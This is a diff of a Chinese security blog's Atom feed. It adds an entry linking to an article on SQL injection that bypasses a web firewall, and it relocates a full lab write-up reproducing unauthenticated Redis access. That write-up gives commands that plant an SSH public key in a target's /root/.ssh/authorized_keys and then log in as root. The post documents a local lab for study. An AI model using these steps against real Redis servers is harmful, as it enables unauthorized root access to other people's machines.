@@ -40,13 +40,36 @@
   </entry>
   
   <entry>
+    <title>一次实战sql注入bypass某狗</title>
+    <link href="https://www.wafer.org.cn/2020/03/27/%E4%B8%80%E6%AC%A1%E5%AE%9E%E6%88%98sql%E6%B3%A8%E5%85%A5%E7%BB%95%E7%8B%97/"/>
+    <id>https://www.wafer.org.cn/2020/03/27/%E4%B8%80%E6%AC%A1%E5%AE%9E%E6%88%98sql%E6%B3%A8%E5%85%A5%E7%BB%95%E7%8B%97/</id>
+    <published>2020-03-27T13:27:17.000Z</published>
+    <updated>2020-04-15T11:44:21.811Z</updated>
+    
+    <content type="html"><![CDATA[<p><img data-src="/2020/03/27/%E4%B8%80%E6%AC%A1%E5%AE%9E%E6%88%98sql%E6%B3%A8%E5%85%A5%E7%BB%95%E7%8B%97/1.png" alt="1.png"></p><a id="more"></a><p><a href="https://xz.aliyun.com/t/7515" target="_blank" rel="noopener">一次实战sql注入bypass某狗</a></p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;&lt;img src=&quot;/2020/03/27/%E4%B8%80%E6%AC%A1%E5%AE%9E%E6%88%98sql%E6%B3%A8%E5%85%A5%E7%BB%95%E7%8B%97/1.png&quot; alt=&quot;1.png&quot;&gt;&lt;/p&gt;
+    
+    </summary>
+    
+    
+      <category term="漏洞" scheme="https://www.wafer.org.cn/categories/%E6%BC%8F%E6%B4%9E/"/>
+    
+    
+      <category term="漏洞" scheme="https://www.wafer.org.cn/tags/%E6%BC%8F%E6%B4%9E/"/>
+    
+  </entry>
+  
+  <entry>
     <title>实战bypass云锁</title>
     <link href="https://www.wafer.org.cn/2020/03/27/%E5%AE%9E%E6%88%98bypass%E4%BA%91%E9%94%81/"/>
     <id>https://www.wafer.org.cn/2020/03/27/%E5%AE%9E%E6%88%98bypass%E4%BA%91%E9%94%81/</id>
     <published>2020-03-27T13:27:17.000Z</published>
-    <updated>2020-04-15T11:38:49.367Z</updated>
+    <updated>2020-04-15T11:42:38.633Z</updated>
     
-    <content type="html"><![CDATA[<p><img data-src="/2020/03/27/%E5%AE%9E%E6%88%98bypass%E4%BA%91%E9%94%81/1.png" alt="1.png"></p><a id="more"></a><p><a href="https://www.jianshu.com/p/b2da19279f1f" target="_blank" rel="noopener">一次实战sql注入bypass云锁</a></p>]]></content>
+    <content type="html"><![CDATA[<p><img data-src="/2020/03/27/%E5%AE%9E%E6%88%98bypass%E4%BA%91%E9%94%81/1.png" alt="1.png"></p><a id="more"></a><p><a href="https://xz.aliyun.com/t/7522" target="_blank" rel="noopener">一次实战sql注入bypass云锁</a></p>]]></content>
     
     <summary type="html">
     
@@ -205,29 +228,6 @@
   </entry>
   
   <entry>
-    <title>redis未授权访问利用复现</title>
-    <link href="https://www.wafer.org.cn/2019/11/06/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/"/>
-    <id>https://www.wafer.org.cn/2019/11/06/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/</id>
-    <published>2019-11-06T07:42:38.171Z</published>
-    <updated>2019-10-11T07:41:37.974Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="redis介绍"><a href="#redis介绍" class="headerlink" title="redis介绍"></a>redis介绍</h1><p>Redis 默认情况下，会绑定在 0.0.0.0:6379，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样将会将 Redis 服务暴露到公网上，如果在没有设置密码认证（一般为空）的情况下，会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。攻击者在未授权访问 Redis 的情况下，利用 Redis 自身的提供的config 命令，可以进行写文件操作，攻击者可以成功将自己的ssh公钥写入目标服务器的 /root/.ssh 文件夹的authotrized_keys 文件中，进而可以使用对应私钥直接使用ssh服务登录目标服务器。</p><a id="more"></a><h2 id="本地漏洞环境搭建"><a href="#本地漏洞环境搭建" class="headerlink" title="本地漏洞环境搭建"></a>本地漏洞环境搭建</h2><p>本文参考了<a href="https://www.cnblogs.com/bmjoker/p/9548962.html" target="_blank" rel="noopener"> bmjoker</a><br>这里主要说一下这篇文章未提及到的坑。</p><p>靶机：Ubuntu</p><p>Ubuntu安装redis</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wget http:<span class="comment">//download.redis.io/releases/redis-3.2.0.tar.gz</span></span><br><span class="line">tar xzf redis<span class="number">-3.2</span><span class="number">.0</span>.tar.gz</span><br><span class="line">cd redis<span class="number">-3.2</span><span class="number">.0</span></span><br><span class="line">make</span><br></pre></td></tr></table></figure><p>修改配置文件，使可以远程访问：</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">vim</span> redis.<span class="keyword">conf</span></span><br></pre></td></tr></table></figure><p>在bind 127.0.0.1前面加上#号 protected-mode设为no 启动redis-server<br>make结束后，进入src目录：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> src</span><br></pre></td></tr></table></figure><p>将redis-server和redis-cli拷贝到/usr/bin目录下（这样启动redis-server和redis-cli就不用每次都进入安装目录了）<br><img data-src="/2019/11/06/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/12.png" alt="12.png"><br>返回目录redis-3.2.0，将redis.conf拷贝到/etc/目录下：<br><img data-src="/2019/11/06/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/13.png" alt="13.png"></p><p>使用/etc/目录下的reids.conf文件中的配置启动redis服务：<br><img data-src="/2019/11/06/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/11.png" alt="11.png"></p><p>服务启动成功，漏洞环境搭建完成</p><h2 id="利用姿势"><a href="#利用姿势" class="headerlink" title="利用姿势"></a>利用姿势</h2><h3 id="利用”公私钥”认证获取root权限"><a href="#利用”公私钥”认证获取root权限" class="headerlink" title="利用”公私钥”认证获取root权限"></a>利用”公私钥”认证获取root权限</h3><p>先在本地生成一对ssh公钥和私钥，设置密码为空:<br><img data-src="/2019/11/06/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/10.png" alt="10.png"><br>进入.ssh目录：cd /.ssh(这里有个坑如果不是root用户就用 cd ~/.ssh)，将生成的公钥保存到waf.txt:</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(echo -e <span class="string">"<span class="subst">\n</span><span class="subst">\n</span>"</span>; cat id_rsa.pub; echo -e <span class="string">"<span class="subst">\n</span><span class="subst">\n</span>"</span>) &gt; waf.txt</span><br></pre></td></tr></table></figure><p>链接靶机上的redis服务，</p><p>将保存ssh的公钥waf.txt写入redis（使用redis-cli -h ip命令连接靶机，将文件写入）：</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat waf.txt | redis-cli -h <span class="number">172.22</span><span class="number">.151</span><span class="number">.147</span> -x set s-<span class="type">key</span></span><br></pre></td></tr></table></figure><p>远程登录靶机的redis服务：redis-cli -h 172.22.151.147<br>并使用 CONFIG GET dir 命令得到redis备份的路径：<br>更改redis备份路径为ssh公钥存放目录（一般默认为/root/.ssh）:<br>设置上传公钥的备份文件名字为authorized_keys：<br>然后保存 退出</p><p><img data-src="/2019/11/06/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/2.png" alt="2.png"></p><p>这里还有个坑，config set dir /root/.ssh 找不到<br><img data-src="/2019/11/06/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/4.png" alt="4.png"><br>因为这里我是首次安装Ubuntu,没有用root用户登录ssh,现在用</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">ssh localhost</span></span><br></pre></td></tr></table></figure><p><img data-src="/2019/11/06/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/6.png" alt="6.png"></p><p>现在用这个命令连接，成功免密登录</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -i id_rsa <span class="symbol">root@</span><span class="number">172.22</span><span class="number">.151</span><span class="number">.147</span></span><br></pre></td></tr></table></figure><p><img data-src="/2019/11/06/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/1.png" alt="1.png"></p><p>这篇文章到此结束，写的时候之艰难，第一次用hexo写文章。</p>]]></content>
-    
-    <summary type="html">
-    
-      &lt;h1 id=&quot;redis介绍&quot;&gt;&lt;a href=&quot;#redis介绍&quot; class=&quot;headerlink&quot; title=&quot;redis介绍&quot;&gt;&lt;/a&gt;redis介绍&lt;/h1&gt;&lt;p&gt;Redis 默认情况下，会绑定在 0.0.0.0:6379，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样将会将 Redis 服务暴露到公网上，如果在没有设置密码认证（一般为空）的情况下，会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。攻击者在未授权访问 Redis 的情况下，利用 Redis 自身的提供的config 命令，可以进行写文件操作，攻击者可以成功将自己的ssh公钥写入目标服务器的 /root/.ssh 文件夹的authotrized_keys 文件中，进而可以使用对应私钥直接使用ssh服务登录目标服务器。&lt;/p&gt;
-    
-    </summary>
-    
-    
-      <category term="漏洞" scheme="https://www.wafer.org.cn/categories/%E6%BC%8F%E6%B4%9E/"/>
-    
-    
-      <category term="漏洞复现" scheme="https://www.wafer.org.cn/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
-    
-  </entry>
-  
-  <entry>
     <title>一道php反序列化的ctf题</title>
     <link href="https://www.wafer.org.cn/2019/11/06/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
     <id>https://www.wafer.org.cn/2019/11/06/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</id>
@@ -247,6 +247,29 @@
     
     
       <category term="php代码审计" scheme="https://www.wafer.org.cn/tags/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>redis未授权访问利用复现</title>
+    <link href="https://www.wafer.org.cn/2019/11/06/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/"/>
+    <id>https://www.wafer.org.cn/2019/11/06/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/</id>
+    <published>2019-11-06T07:42:38.171Z</published>
+    <updated>2019-10-11T07:41:37.974Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="redis介绍"><a href="#redis介绍" class="headerlink" title="redis介绍"></a>redis介绍</h1><p>Redis 默认情况下，会绑定在 0.0.0.0:6379，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样将会将 Redis 服务暴露到公网上，如果在没有设置密码认证（一般为空）的情况下，会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。攻击者在未授权访问 Redis 的情况下，利用 Redis 自身的提供的config 命令，可以进行写文件操作，攻击者可以成功将自己的ssh公钥写入目标服务器的 /root/.ssh 文件夹的authotrized_keys 文件中，进而可以使用对应私钥直接使用ssh服务登录目标服务器。</p><a id="more"></a><h2 id="本地漏洞环境搭建"><a href="#本地漏洞环境搭建" class="headerlink" title="本地漏洞环境搭建"></a>本地漏洞环境搭建</h2><p>本文参考了<a href="https://www.cnblogs.com/bmjoker/p/9548962.html" target="_blank" rel="noopener"> bmjoker</a><br>这里主要说一下这篇文章未提及到的坑。</p><p>靶机：Ubuntu</p><p>Ubuntu安装redis</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wget http:<span class="comment">//download.redis.io/releases/redis-3.2.0.tar.gz</span></span><br><span class="line">tar xzf redis<span class="number">-3.2</span><span class="number">.0</span>.tar.gz</span><br><span class="line">cd redis<span class="number">-3.2</span><span class="number">.0</span></span><br><span class="line">make</span><br></pre></td></tr></table></figure><p>修改配置文件，使可以远程访问：</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">vim</span> redis.<span class="keyword">conf</span></span><br></pre></td></tr></table></figure><p>在bind 127.0.0.1前面加上#号 protected-mode设为no 启动redis-server<br>make结束后，进入src目录：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> src</span><br></pre></td></tr></table></figure><p>将redis-server和redis-cli拷贝到/usr/bin目录下（这样启动redis-server和redis-cli就不用每次都进入安装目录了）<br><img data-src="/2019/11/06/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/12.png" alt="12.png"><br>返回目录redis-3.2.0，将redis.conf拷贝到/etc/目录下：<br><img data-src="/2019/11/06/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/13.png" alt="13.png"></p><p>使用/etc/目录下的reids.conf文件中的配置启动redis服务：<br><img data-src="/2019/11/06/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/11.png" alt="11.png"></p><p>服务启动成功，漏洞环境搭建完成</p><h2 id="利用姿势"><a href="#利用姿势" class="headerlink" title="利用姿势"></a>利用姿势</h2><h3 id="利用”公私钥”认证获取root权限"><a href="#利用”公私钥”认证获取root权限" class="headerlink" title="利用”公私钥”认证获取root权限"></a>利用”公私钥”认证获取root权限</h3><p>先在本地生成一对ssh公钥和私钥，设置密码为空:<br><img data-src="/2019/11/06/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/10.png" alt="10.png"><br>进入.ssh目录：cd /.ssh(这里有个坑如果不是root用户就用 cd ~/.ssh)，将生成的公钥保存到waf.txt:</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(echo -e <span class="string">"<span class="subst">\n</span><span class="subst">\n</span>"</span>; cat id_rsa.pub; echo -e <span class="string">"<span class="subst">\n</span><span class="subst">\n</span>"</span>) &gt; waf.txt</span><br></pre></td></tr></table></figure><p>链接靶机上的redis服务，</p><p>将保存ssh的公钥waf.txt写入redis（使用redis-cli -h ip命令连接靶机，将文件写入）：</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat waf.txt | redis-cli -h <span class="number">172.22</span><span class="number">.151</span><span class="number">.147</span> -x set s-<span class="type">key</span></span><br></pre></td></tr></table></figure><p>远程登录靶机的redis服务：redis-cli -h 172.22.151.147<br>并使用 CONFIG GET dir 命令得到redis备份的路径：<br>更改redis备份路径为ssh公钥存放目录（一般默认为/root/.ssh）:<br>设置上传公钥的备份文件名字为authorized_keys：<br>然后保存 退出</p><p><img data-src="/2019/11/06/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/2.png" alt="2.png"></p><p>这里还有个坑，config set dir /root/.ssh 找不到<br><img data-src="/2019/11/06/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/4.png" alt="4.png"><br>因为这里我是首次安装Ubuntu,没有用root用户登录ssh,现在用</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">ssh localhost</span></span><br></pre></td></tr></table></figure><p><img data-src="/2019/11/06/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/6.png" alt="6.png"></p><p>现在用这个命令连接，成功免密登录</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -i id_rsa <span class="symbol">root@</span><span class="number">172.22</span><span class="number">.151</span><span class="number">.147</span></span><br></pre></td></tr></table></figure><p><img data-src="/2019/11/06/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/1.png" alt="1.png"></p><p>这篇文章到此结束，写的时候之艰难，第一次用hexo写文章。</p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;h1 id=&quot;redis介绍&quot;&gt;&lt;a href=&quot;#redis介绍&quot; class=&quot;headerlink&quot; title=&quot;redis介绍&quot;&gt;&lt;/a&gt;redis介绍&lt;/h1&gt;&lt;p&gt;Redis 默认情况下，会绑定在 0.0.0.0:6379，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样将会将 Redis 服务暴露到公网上，如果在没有设置密码认证（一般为空）的情况下，会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。攻击者在未授权访问 Redis 的情况下，利用 Redis 自身的提供的config 命令，可以进行写文件操作，攻击者可以成功将自己的ssh公钥写入目标服务器的 /root/.ssh 文件夹的authotrized_keys 文件中，进而可以使用对应私钥直接使用ssh服务登录目标服务器。&lt;/p&gt;
+    
+    </summary>
+    
+    
+      <category term="漏洞" scheme="https://www.wafer.org.cn/categories/%E6%BC%8F%E6%B4%9E/"/>
+    
+    
+      <category term="漏洞复现" scheme="https://www.wafer.org.cn/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
     
   </entry>
   
